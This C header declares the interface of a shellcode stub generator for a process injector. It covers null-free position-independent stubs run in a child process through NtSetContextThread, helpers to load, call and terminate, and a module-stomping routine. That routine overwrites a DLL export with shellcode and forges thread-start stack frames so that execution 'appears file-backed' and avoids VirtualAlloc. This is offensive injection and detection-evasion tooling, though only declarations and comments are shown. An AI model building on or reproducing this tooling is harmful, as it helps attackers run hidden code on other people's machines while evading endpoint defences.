#ifndef SHELLWRITER_H
#define SHELLWRITER_H

#include "native.h"

/* Null-free PIC stub generator. Runs injector-side; output placed in
 * ShellInfo.Buffer and executed via NtSetContextThread in the child.
 * Crystal Palace constraints: no CRT, no globals, no switch, no heap. */

/* kernel32/ntdll share ASLR bases across all processes, so injector-side
 * API addresses baked into the stub are valid in the target. */

/* Buffer size for scw_stomp_and_call output. */
#define SCW_STUB_SIZE(payload_len) (((payload_len) / 8 + 1) * 24 + 640)

/* Frame alloc sizes sourced from UNWIND_INFO on Win10/11 x64. */
#define SCW_BTIT_ALLOC 0x28 /* BaseThreadInitThunk: push rbx(8) + sub rsp,0x20 */
#define SCW_RUTS_ALLOC 0x38 /* RtlUserThreadStart  */

typedef struct
{
    u8 *buf;         /* caller-provided output buffer */
    int len;         /* bytes written                 */
    int cap;         /* buffer capacity               */
    int stack_bytes; /* runtime RSP depth since entry */
} SCW;

void scw_init(SCW *w, u8 *buf, int cap);
int scw_check_nulls(const SCW *w); /* returns offset of first null, or -1 */
void scw_append(SCW *w, const u8 *b, int n);

/* Primitives */
void scw_set_rax(SCW *w, u64 value);
void scw_push_value(SCW *w, u64 value);
void scw_push_buffer(SCW *w, const u8 *data, int len);
void scw_set_arg(SCW *w, int reg, u64 value);
void scw_set_arg_sp(SCW *w, int reg, int offset);
void scw_call(SCW *w, u64 addr);

/* High-level emitters */
void scw_load_and_call(SCW *w, u64 virtual_alloc, u64 virtual_protect,
                       const u8 *sc, int sc_len);

void scw_call_loadlib(SCW *w, u64 loadlibrary_a, const char *dll_name);

void scw_call_msgbox(SCW *w, u64 messagebox_a,
                     const char *text, const char *caption, u32 type);

void scw_call_terminate(SCW *w, u64 nt_terminate,
                        u64 handle, u32 exit_status);

/* Module-stomping stub: PEB-walks to dll_name!export_name, stomps it with
 * sc, pivots RSP to TEB.StackBase-0x200, plants BTIT/RUTS frame chain,
 * then jumps in. Execution appears file-backed; no VirtualAlloc. */
void scw_stomp_and_call(SCW *w, u64 virtual_protect,
                        const char *dll_name, const char *export_name,
                        const u8 *sc, int sc_len,
                        u64 btit_addr, u64 ruts_addr);

#endif /* SHELLWRITER_H */
